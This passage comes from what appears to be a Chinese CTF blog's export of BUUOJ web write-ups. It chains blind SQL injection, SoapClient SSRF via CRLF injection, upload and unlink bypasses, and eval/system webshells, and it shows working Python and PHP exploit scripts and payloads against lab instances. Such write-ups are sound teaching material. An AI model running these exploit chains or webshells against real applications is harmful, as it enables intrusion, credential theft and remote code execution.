class=\"params\">$columns,$table,$values</span>)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    $column = <span class=\"keyword\">$this</span>-&gt;get_column($columns);</span><br><span class=\"line\">    $value = <span class=\"string\">&#x27;(&#x27;</span>.preg_replace(<span class=\"string\">&#x27;/`([^`,]+)`/&#x27;</span>,<span class=\"string\">&#x27;\\&#x27;$&#123;1&#125;\\&#x27;&#x27;</span>,<span class=\"keyword\">$this</span>-&gt;get_column($values)).<span class=\"string\">&#x27;)&#x27;</span>;</span><br><span class=\"line\">    $nid =</span><br><span class=\"line\">    $sql = <span class=\"string\">&#x27;insert into &#x27;</span>.$table.<span class=\"string\">&#x27;(&#x27;</span>.$column.<span class=\"string\">&#x27;) values &#x27;</span>.$value;</span><br><span class=\"line\">    $result = <span class=\"keyword\">$this</span>-&gt;conn-&gt;query($sql);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> $result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\r\n<p><span class=\"math inline\">\\(column通过get_column()获得，将传入的\\)</span>columns组成用反引号包裹的字符串，如：`<span class=\"math inline\">\\(columns[0],\\`\\)</span>columns[1]`，重点是<span class=\"math inline\">\\(value，preg_replace的正则意思是如果原\\)</span>value不存在`或,，就将反引号包裹的$value转成单引号包裹。效果如下图：</p>\r\n<img src=\"/2019/09/17/BUUOJ%E5%88%B7%E9%A2%98-Web-shellshellshell/preg_replace.png\" class=\"\" title=\"insert的preg_replace\">\r\n<p>这样就会对SQL注入带来麻烦，如<span class=\"math inline\">\\(values=array(&quot;admin&quot;,&quot;test&#39; or 1=1,3#&quot;);，过get_column()处理后变成&quot;\\`admin\\`,\\`test&#39; or 1=1,3#\\`&quot;，再过preg_replace后变成&quot;&#39;admin&#39;,\\`test&#39; or 1=1,3#\\`&quot;。在逗号之前没出现另一个反引号，造成test前的反引号没有配对，无法转换，保留下来，造成实际执行的SQL语句不合法。那么我们如果在其中插入反引号会怎样？\\)</span>values=array(\"admin\",\"`test' or 1=1,3#\");过get_column()处理变成\"`admin`,``test' or 1=1,3#`\"，过preg_replace变成\"'admin',``test' or 1=1,3#`\"，还是不对。那么换个位置怎样？$values=array(\"admin\",\"test`' or 1=1,3#\");过get_column()变成\"`admin`,`test`' or 1=1,3#`\"，再过preg_replace变成\"'admin','test'' or 1=1,3#`\"，好了我们逃逸出来一个单引号，那就够了。</p>\r\n<p>上文提到的user.php中的publish()允许我们用POST提交signature，条件满足，写脚本吧。这是个insert类型注入，用sleep盲注。注入的数据大概为324`,3),((if(ascii(substring((select database()),1))=102,sleep(5),1)),1,2,3)#，带入SQL就变成了 <code>insert into ctf_user_signature( `userid`,`username`,`signature`,`mood` ) values ( '1','test','324',3),((if(ascii(substring((select database()),1))=102,sleep(5),1)),1,2,3)#`,'O:4:\\\"Mood\\\":3:&#123;s:4:\\\"mood\\\";i:1;s:2:\\\"ip\\\";s:11:\\\"192.168.1.4\\\";s:4:\\\"date\\\";i:1568730153;&#125;' )</code></p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">header = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;Cookie&quot;</span>: <span class=\"string\">&quot;PHPSESSID=2hl10o0f976664asa88vkcoeq6&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">url = <span class=\"string\">&quot;http://62614c8b-c370-493c-bb6f-1087ddf417bc.node1.buuoj.cn/index.php?action=publish&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">result = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> a <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, <span class=\"number\">32</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> (string.ascii_lowercase+string.digits):</span><br><span class=\"line\">        data = &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;signature&quot;</span>: <span class=\"string\">&quot;324`,3),((if(ascii(substring((select password from ctf_users where username=0x61646d696e),&#123;0&#125;,1))=&#123;1&#125;,sleep(15),1)),1,2,3)#&quot;</span>.format(a,</span><br><span class=\"line\">                                                                                                                     ord(b)),</span><br><span class=\"line\">            <span class=\"string\">&quot;mood&quot;</span>: <span class=\"number\">1</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            time.sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">            x = requests.post(url=url, headers=header, data=data, timeout=<span class=\"number\">13</span>)</span><br><span class=\"line\">            print(data)</span><br><span class=\"line\">            x.close()</span><br><span class=\"line\">        <span class=\"keyword\">except</span> requests.exceptions.Timeout:</span><br><span class=\"line\">            result += b</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    time.sleep(<span class=\"number\">5</span>)</span><br><span class=\"line\">    print(result)</span><br></pre></td></tr></table></figure>\r\n<p>我们已知用户名为admin，直接从ctf_users表读密码并且password一定是MD5可以限定字符集，由于网络问题可能出现错误，多试几次。得到MD5：c991707fdf339958eded91331fb11ba0，解得jaivypassword。</p>\r\n<h1 id=\"part-2.-soapclient-ssrf\">Part 2. SoapClient SSRF</h1>\r\n<p>但是我们直接登录后发现不允许我们登录。提示：You can only login at the usual address。回去翻源码。用的get_ip()返回$_SERVER['REMOTE_ADDR']，这个没法绕过。我们需要能本地访问的方法，要么绕过REMOTE_ADDR，要么找到一处SSRF，登录后返回Cookie，我们再用Cookie登录。</p>\r\n<p>然后注意到publish()还有一处奇怪的地方：$mood = addslashes(serialize(new Mood((int)$_POST['mood'],get_ip())));。可以序列化，当前代码里没有任何有关SSRF的类，那么就要考虑PHP本地类了。这里参考<a href=\"https://xz.aliyun.com/t/2148\">N1CTF 2018 Easy&amp;&amp;Hard PHP</a>，使用SoapClient。 <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$headers = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">    <span class=\"string\">&#x27;Cookie: PHPSESSID=8qpm643062ib88mnqerme74kl4&#x27;</span> <span class=\"comment\">#我们先访问login页面分配一个Cookie，同时爆破得到验证码</span></span><br><span class=\"line\">);</span><br><span class=\"line\">$target = <span class=\"string\">&#x27;http://a0d22f20-788f-4ba7-9960-cc8ee356962c.node1.buuoj.cn/index.php?action=login&#x27;</span>;</span><br><span class=\"line\">$post_string = <span class=\"string\">&#x27;username=admin&amp;password=jaivypassword&amp;code=267234&#x27;</span>;<span class=\"comment\">#刚才爆破得到的验证码</span></span><br><span class=\"line\"></span><br><span class=\"line\">$b = <span class=\"keyword\">new</span> SoapClient(<span class=\"literal\">null</span>, <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;location&#x27;</span> =&gt; $target,</span><br><span class=\"line\">    <span class=\"string\">&#x27;user_agent&#x27;</span> =&gt; <span class=\"string\">&#x27;wupco^^Content-Type:application/x-www-form-urlencoded^^&#x27;</span> . join(<span class=\"string\">&#x27;^^&#x27;</span>, $headers) . <span class=\"string\">&#x27;^^Content-Length:&#x27;</span> . (<span class=\"keyword\">string</span>)strlen($post_string) . <span class=\"string\">&#x27;^^^^&#x27;</span> . $post_string,</span><br><span class=\"line\">    <span class=\"string\">&#x27;uri&#x27;</span> =&gt; <span class=\"string\">&quot;aaab&quot;</span>));</span><br><span class=\"line\"><span class=\"comment\">//因为user-agent是可以控制的，因此可以利用crlf注入http头来发送post请求</span></span><br><span class=\"line\">$aaa = serialize($b);</span><br><span class=\"line\">$aaa = str_replace(<span class=\"string\">&#x27;^^&#x27;</span>, <span class=\"string\">&#x27;%0d%0a&#x27;</span>, $aaa);</span><br><span class=\"line\">$aaa = str_replace(<span class=\"string\">&#x27;&amp;&#x27;</span>, <span class=\"string\">&#x27;%26&#x27;</span>, $aaa);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $aaa;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure> 得到结果O:10:\"SoapClient\":4:{s:3:\"uri\";s:4:\"aaab\";s:8:\"location\";s:81:\"http://a0d22f20-788f-4ba7-9960-cc8ee356962c.node1.buuoj.cn/index.php?action=login\";s:11:\"_user_agent\";s:171:\"wupco%0d%0aContent-Type:application/x-www-form-urlencoded%0d%0aCookie: PHPSESSID=8qpm643062ib88mnqerme74kl4%0d%0aContent-Length:49%0d%0a%0d%0ausername=admin%26password=jaivypassword%26code=267234\";s:13:\"_soap_version\";i:1;}\n</p>\r\n<p>下面的问题是我们的$_POST['Mood']被转成int处理了，没法注入进去。然后我们发现user.php中showmess()会将数据库中的Mood读出来：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">function showmess()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        if(!$this-&gt;check_login()) return false;</span><br><span class=\"line\">        if($this-&gt;is_admin == 0)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            //id,sig,mood,ip,country,subtime</span><br><span class=\"line\">            $db = new Db();</span><br><span class=\"line\"><span class=\"meta\">            @$ret = $db-&gt;select(array(&#x27;username&#x27;,&#x27;signature&#x27;,&#x27;mood&#x27;,&#x27;id&#x27;),&#x27;ctf_user_signature&#x27;,&quot;userid = $this-&gt;userid order by id desc&quot;);</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span>($ret) &#123;</span><br><span class=\"line\">                $data = array();</span><br><span class=\"line\">                while ($row = $ret-&gt;fetch_row()) &#123;</span><br><span class=\"line\">                    $sig = $row[<span class=\"number\">1</span>];</span><br><span class=\"line\">                    $mood = unserialize($row[<span class=\"number\">2</span>]);</span><br><span class=\"line\">                    $country = $mood-&gt;getcountry();</span><br><span class=\"line\">                    $ip = $mood-&gt;ip;</span><br><span class=\"line\">                    $subtime = $mood-&gt;getsubtime();</span><br><span class=\"line\">                    $allmess = array(&#x27;id&#x27;=&gt;$row[3],&#x27;sig&#x27; =&gt; $sig, &#x27;mood&#x27; =&gt; $mood, &#x27;ip&#x27; =&gt; $ip, &#x27;country&#x27; =&gt; $country, &#x27;subtime&#x27; =&gt; $subtime);</span><br><span class=\"line\">                    array_push($data, $allmess);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                $data = json_encode(array(&#x27;code&#x27;=&gt;0,&#x27;data&#x27;=&gt;$data));</span><br><span class=\"line\">                <span class=\"keyword\">return</span> $data;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">else</span></span><br><span class=\"line\">                <span class=\"keyword\">return</span> false;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\r\n<p>我们就不必考虑绕过int转换了，在刚才的SQL注入那里我们可以插入一个Mood，所以我们的Payload为： <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$target = <span class=\"string\">&#x27;http://127.0.0.1/index.php?action=login&#x27;</span>;<span class=\"comment\"># 一定得是127.0.0.1，SSRF要从本地访问</span></span><br><span class=\"line\">$headers = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">    <span class=\"string\">&#x27;Cookie: PHPSESSID=kvvs649604t498pgc5sp936oa5&#x27;</span><span class=\"comment\"># 重新分配一个未登陆的Cookie，提前爆破好验证码</span></span><br><span class=\"line\">);</span><br><span class=\"line\">$post_string = <span class=\"string\">&#x27;username=admin&amp;password=jaivypassword&amp;code=497567&#x27;</span>; <span class=\"comment\">#code为刚才爆破好的</span></span><br><span class=\"line\">$b = <span class=\"keyword\">new</span> SoapClient(<span class=\"literal\">null</span>, <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;location&#x27;</span> =&gt; $target,</span><br><span class=\"line\">    <span class=\"string\">&#x27;user_agent&#x27;</span> =&gt; <span class=\"string\">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span> . join(<span class=\"string\">&#x27;^^&#x27;</span>, $headers) . <span class=\"string\">&#x27;^^Content-Length: &#x27;</span> . (<span class=\"keyword\">string</span>)strlen($post_string) . <span class=\"string\">&#x27;^^^^&#x27;</span> . $post_string,</span><br><span class=\"line\">    <span class=\"string\">&#x27;uri&#x27;</span> =&gt; <span class=\"string\">&quot;aaab&quot;</span>));</span><br><span class=\"line\">$aaa = serialize($b);</span><br><span class=\"line\">$aaa = str_replace(<span class=\"string\">&#x27;^^&#x27;</span>, <span class=\"string\">&quot;\\r\\n&quot;</span>, $aaa);</span><br><span class=\"line\">$aaa = str_replace(<span class=\"string\">&#x27;&amp;&#x27;</span>, <span class=\"string\">&#x27;&amp;&#x27;</span>, $aaa);<span class=\"comment\">#&amp;字符不能改变</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> bin2hex($aaa);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\r\n<p>然后新建一个用户，正常登陆，在publish的时候提交signature=q3e13`,0x4f3a31303a22536f6170436c69656e74223a343a7b733a333a22757269223b733a343a2261616162223b733a383a226c6f636174696f6e223b733a33393a22687474703a2f2f3132372e302e302e312f696e6465782e7068703f616374696f6e3d6c6f67696e223b733a31313a225f757365725f6167656e74223b733a3137333a22777570636f0d0a436f6e74656e742d547970653a206170706c69636174696f6e2f782d7777772d666f726d2d75726c656e636f6465640d0a436f6f6b69653a205048505345535349443d6b767673363439363034743439387067633573703933366f61350d0a436f6e74656e742d4c656e6774683a2034390d0a0d0a757365726e616d653d61646d696e2670617373776f72643d6a6169767970617373776f726426636f64653d343937353637223b733a31333a225f736f61705f76657273696f6e223b693a313b7d)%23&mood=1一大串16进制字符为刚才Payload的结果。然后访问一下index.php，会返回500，我们的目的已经达到了。</p>\r\n<p>用Payload中的Cookie登陆，就进入admin了。</p>\r\n<p>publish页面变为上传了，我们可以上传任意的文件，没有做任何限制。我们上传个一句话然后AntSword连接。</p>\r\n<h1 id=\"part-3.-internat-exploit\">Part 3. Internat Exploit</h1>\r\n<p>扫一下IP，在.7那里有一个index.php文件，拖回来看一下：</p>\r\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$sandbox = <span class=\"string\">&#x27;/var/sandbox/&#x27;</span> . md5(<span class=\"string\">&quot;prefix&quot;</span> . $_SERVER[<span class=\"string\">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class=\"line\">@mkdir($sandbox);</span><br><span class=\"line\">@chdir($sandbox);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>($_FILES[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>])&#123;</span><br><span class=\"line\">    $filename = !<span class=\"keyword\">empty</span>($_POST[<span class=\"string\">&#x27;file&#x27;</span>]) ? $_POST[<span class=\"string\">&#x27;file&#x27;</span>] : $_FILES[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!is_array($filename)) &#123;</span><br><span class=\"line\">        $filename = explode(<span class=\"string\">&#x27;.&#x27;</span>, $filename);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $ext = end($filename);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($ext==$filename[count($filename) - <span class=\"number\">1</span>])&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;try again!!!&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $new_name = (<span class=\"keyword\">string</span>)rand(<span class=\"number\">100</span>,<span class=\"number\">999</span>).<span class=\"string\">&quot;.&quot;</span>.$ext;</span><br><span class=\"line\">    move_uploaded_file([<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>],$new_name);</span><br><span class=\"line\">    $_ = $_POST[<span class=\"string\">&#x27;hello&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(@substr(file($_)[<span class=\"number\">0</span>],<span class=\"number\">0</span>,<span class=\"number\">6</span>)===<span class=\"string\">&#x27;@&lt;?php&#x27;</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(strpos($_,$new_name)===<span class=\"literal\">false</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">include</span>($_);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;you can do it!&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    unlink($new_name);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>老题了，如果<span class=\"math inline\">\\(ext==\\)</span>filename[count($filename) - 1]，die()，<span class=\"math inline\">\\(filename可以直接传入，因此我们可以传个file[0]与file[1]，问题在于end()，end()返回数组最后一个元素，但并不是按照数组索引的顺序排列的，而是按照赋值顺序。也就是说我们传入file[1]=aaa,file[0]=bbb，文件名为bbb.aaa，end()返回的是bbb，第一个die就可以绕过了。然后是将传入的文件重命名成000-999之间随机的数字+\\)</span>ext。然后unlink()删除，unlink()是可以绕过的。如果unlink传入的文件名带有路径字符，就会失败。如传入\"aaa.php/.\"，move_uploaded_file()会将文件名正规化处理，删掉不必要的字符，结果/.被删除，但是unlink()无法处理路径，直接返回失败，导致文件被保留。</p>\r\n<p>最后一个问题，我们没办法直接访问到shell，要通过POST的Hello访问，因此我们的Shell要以@<?php开头，为了方便起见我们直接写system了。flag在/etc目录下的一个txt里。\r\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">$curl = curl_init();</span><br><span class=\"line\"></span><br><span class=\"line\">curl_setopt_array($curl, <span class=\"keyword\">array</span>(</span><br><span class=\"line\">  CURLOPT_URL =&gt; <span class=\"string\">&quot;http://172.64.190.7&quot;</span>,</span><br><span class=\"line\">  CURLOPT_RETURNTRANSFER =&gt; <span class=\"literal\">true</span>,</span><br><span class=\"line\">  CURLOPT_ENCODING =&gt; <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">  CURLOPT_MAXREDIRS =&gt; <span class=\"number\">10</span>,</span><br><span class=\"line\">  CURLOPT_TIMEOUT =&gt; <span class=\"number\">30</span>,</span><br><span class=\"line\">  CURLOPT_HTTP_VERSION =&gt; CURL_HTTP_VERSION_1_1,</span><br><span class=\"line\">  CURLOPT_CUSTOMREQUEST =&gt; <span class=\"string\">&quot;POST&quot;</span>,</span><br><span class=\"line\">  CURLOPT_POSTFIELDS =&gt; <span class=\"string\">&quot;------WebKitFormBoundary7MA4YWxkTrZu0gW\\r\\nContent-Disposition: form-data; name=\\&quot;file\\&quot;; filename=\\&quot;tr1ple.php\\&quot;\\r\\nContent-Type: false\\r\\n\\r\\n@&lt;?php system(&#x27;ls -lah /etc&#x27;);\\r\\n\\r\\n------WebKitFormBoundary7MA4YWxkTrZu0gW\\r\\nContent-Disposition: form-data; name=\\&quot;hello\\&quot;\\r\\n\\r\\ntr1ple11.php\\r\\n------WebKitFormBoundary7MA4YWxkTrZu0gW\\r\\nContent-Disposition: form-data; name=\\&quot;file[2]\\&quot;\\r\\n\\r\\n222\\r\\n------WebKitFormBoundary7MA4YWxkTrZu0gW\\r\\nContent-Disposition: form-data; name=\\&quot;file[1]\\&quot;\\r\\n\\r\\n111\\r\\n------WebKitFormBoundary7MA4YWxkTrZu0gW\\r\\nContent-Disposition: form-data; name=\\&quot;file[0]\\&quot;\\r\\n\\r\\n/../tr1ple11.php\\r\\n------WebKitFormBoundary7MA4YWxkTrZu0gW\\r\\nContent-Disposition: form-data; name=\\&quot;submit\\&quot;\\r\\n\\r\\nSubmit\\r\\n------WebKitFormBoundary7MA4YWxkTrZu0gW--&quot;</span>,</span><br><span class=\"line\">  CURLOPT_HTTPHEADER =&gt; <span class=\"keyword\">array</span>(</span><br><span class=\"line\">    <span class=\"string\">&quot;Postman-Token: a23f25ff-a221-47ef-9cfc-3ef4bd560c22&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;cache-control: no-cache&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;content-type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW&quot;</span></span><br><span class=\"line\">  ),</span><br><span class=\"line\">));</span><br><span class=\"line\"></span><br><span class=\"line\">$response = curl_exec($curl);</span><br><span class=\"line\">$err = curl_error($curl);</span><br><span class=\"line\"></span><br><span class=\"line\">curl_close($curl);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> ($err) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;cURL Error #:&quot;</span> . $err;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">echo</span> $response;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure> 在外层题目中访问/upload/php文件名即可拿到flag。</p>\r\n\n    <div id=\"aplayer-vfAFYZzb\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"27514091\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{a09a9251-0245-48d5-8f29-00b18ef2218c}</p>\r\n","categories":["Writeups"],"tags":["Unserialize","PHP","Web","BUUOJ","SQL注入","盲注","SSRF","SoapClient","Slepp"]},{"title":"BUUOJ刷题-Web-极客大挑战2019-Buyflag","url":"/2019/11/25/BUUOJ%E5%88%B7%E9%A2%98-Web-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Buyflag/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>Syclover极客大挑战的一道题，挺简单的。 上来让我们买Flag。抓一下包，很明显的看到Cookie里有个user=0，我们直接改成1，然后要password，页面后面有一段注释。 <a id=\"more\"></a> <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">\t~~~post money <span class=\"keyword\">and</span> password~~~</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">&#x27;password&#x27;</span>])) &#123;</span><br><span class=\"line\">\t$password = $_POST[<span class=\"string\">&#x27;password&#x27;</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (is_numeric($password)) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">elseif</span> ($password == <span class=\"number\">404</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">&quot;Password Right!&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\r\n<p>is_numberic()绕过，在数字后面加上点字符就可以了，一个空格OK。提交password=404%20，又要我们money。注意到这题Cookie没有用上PHPSESSID，那么这题猜一下逻辑就是直接将我们提交的money与要求的1000000比较，不存在记录的过程。</p>\r\n<p>同时注意到，此题用到的是PHP 5.3.5，老版本PHP了。要求我们不能输入8位字符，而输入其他任何字符都会返回you have not enough money,loser~，合理猜测一下用的是strcmp，那么直接money[]=1就可以了。</p>\r\n<p>然后就返回flag了。</p>\r\n\n    <div id=\"aplayer-SDRJtbNC\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"3949506\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{adb90540-9332-4480-a8d7-3d250841adff}</p>\r\n","categories":["Writeups"],"tags":["PHP","Web","BUUOJ"]},{"title":"BUUOJ刷题-Web-ctf473831530_2018_web_virink_web","url":"/2019/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-ctf473831530-2018-web-virink-web/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>这题是CTF学习交流群（473831530）的入群题。上来就给了源码啊。 <a id=\"more\"></a> <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    $sandbox = <span class=\"string\">&#x27;/www/sandbox/&#x27;</span> . md5(<span class=\"string\">&#x27;orange&#x27;</span> . $_SERVER[<span class=\"string\">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class=\"line\">    mkdir($sandbox);</span><br><span class=\"line\">    chdir($sandbox);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">&#x27;cmd&#x27;</span>]) &amp;&amp; strlen($_GET[<span class=\"string\">&#x27;cmd&#x27;</span>]) &lt;= <span class=\"number\">20</span>) &#123;</span><br><span class=\"line\">        exec($_GET[<span class=\"string\">&#x27;cmd&#x27;</span>]);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">&#x27;reset&#x27;</span>])) &#123;</span><br><span class=\"line\">        exec(<span class=\"string\">&#x27;/bin/rm -rf &#x27;</span> . $sandbox);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br /&gt; IP : &#123;\\$_SERVER[&#x27;REMOTE_ADDR&#x27;]&#125;&quot;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\r\n<p>20个字符的命令执行，而且要跨机器操作，我们是一定需要一个Webshell的。可是写不进去。参考<a href=\"%5Bhttps://blog.wonderkun.cc/2017/02/09/%E4%BB%8E%E4%B8%83%E4%B8%AA%E5%AD%97%E7%AC%A6%E9%95%BF%E5%BA%A6%E7%9A%84%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0GetShell/%5D(https://blog.wonderkun.cc/2017/02/09/从七个字符长度的任意命令执行到GetShell/)\">这个</a>和<a href=\"https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge\">这个</a>，我们思路就明确了：利用<code>1=&gt;filename</code>的特性创建特殊的文件，然后<code>ls -tr</code>列文件拼出完整的shell。ls -tr是按照文件创建时间顺序倒序列文件。由于我们的Shell带有大量特殊字符，考虑转义的问题，我们再套一层echo即可。</p>\r\n<p>即我们要写入的内容是<code>echo '&lt;?php eval($_GET[c]);' &gt; 2.txt</code>，可以拆成如下几段：</p>\r\n<ul>\r\n<li><code>echo\\ \\\\</code></li>\r\n<li><code>\\'\\&lt;\\?php \\\\</code></li>\r\n<li><code>eval\\(</code></li>\r\n<li><code>\\$_GET\\[c\\]\\)</code></li>\r\n<li><code>\\;\\'\\&gt;2.txt</code></li>\r\n</ul>\r\n<p>每一个文件名中有空格的都需要在行尾加上<code>\\\\</code>。</p>\r\n<p>我们来试一下效果： <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">base_url = <span class=\"string\">&#x27;http://a40430ad-39b5-4020-a550-14afee81e640.node1.buuoj.cn&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">exec_cmd2</span>(<span class=\"params\">c</span>):</span></span><br><span class=\"line\">    <span class=\"comment\"># exec cmd</span></span><br><span class=\"line\">    my_params = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;cmd&#x27;</span>: c</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    r = requests.get(base_url, params=my_params)</span><br><span class=\"line\">    print(<span class=\"string\">&#x27;exec cmd2&#x27;</span>, c, r)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">write_webshell</span>():</span></span><br><span class=\"line\">    filename = [<span class=\"string\">r&#x27;&gt;echo\\ \\\\&#x27;</span>, <span class=\"string\">r&quot;&gt;\\&#x27;\\&lt;\\?php \\\\&quot;</span>, <span class=\"string\">r&#x27;&gt;eval\\(&#x27;</span>, <span 